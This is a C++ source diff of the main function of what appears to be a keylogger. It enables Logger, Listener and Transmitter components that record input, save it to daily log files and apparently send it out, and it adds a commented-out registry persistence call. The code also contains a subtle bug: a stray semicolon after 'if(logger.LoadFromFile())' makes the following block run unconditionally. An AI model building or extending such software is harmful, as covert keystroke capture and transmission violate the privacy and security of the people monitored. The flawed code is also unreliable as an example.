@@ -9,15 +9,11 @@
 using namespace std;
 
 int main()
-{
-	string s = "salut";
+{	
+	//Add to registery
+	//Utilities::AddToRegistry();
 
-	string encrypt = Utilities::CaesarCypherEncrypt(s, 3000);
-	Utilities::CaesarCypherDecrypt(encrypt, 3000);
-	
-	
-	/*
-	// Start logger and listener
+	// Instanciate the logger, listner and transmitter 
 	Logger logger;
 	Listener listener(&logger);
 	Transmitter transmitter(&logger);
@@ -29,19 +25,18 @@ int main()
 	// Start Logger thread
 	Thread thread_logger(&Logger::Update, &logger);
 	thread_logger.launch();
-
 	
-	// If available load log from file and display it to screen 
+	// If available load today's log from file and display it to screen 
 	if(logger.LoadFromFile());
 	{
 		cout << "Loaded from file" << endl;
 		cout << logger.GetLog() << endl;
 	}
 
-	// Start listening
+	// Start listening and now looping in listener loop
 	listener.Start();
 
-	// If F1 pressed
+	// If F1 is pressed listner stop and qui looping
 	cout << "EXITING!" << endl;
 
 	// Stop threads
@@ -50,6 +45,6 @@ int main()
 
 	// Save log to file
 	logger.SaveToFile();
-	*/
+	
 	return 0;
 }
